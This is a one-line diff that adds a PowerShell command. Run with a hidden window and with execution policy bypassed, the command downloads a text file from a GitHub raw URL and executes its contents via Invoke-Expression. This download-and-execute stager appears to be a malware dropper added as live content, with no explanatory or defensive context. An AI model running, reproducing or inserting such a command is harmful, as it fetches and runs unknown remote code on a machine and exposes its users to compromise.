@@ -1,0 +1,1 @@
+powershell -NoP -NonI -w h -Exec Bypass -c "& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/p.txt; Invoke-Expression $($script.content); $script -eq $null; }"
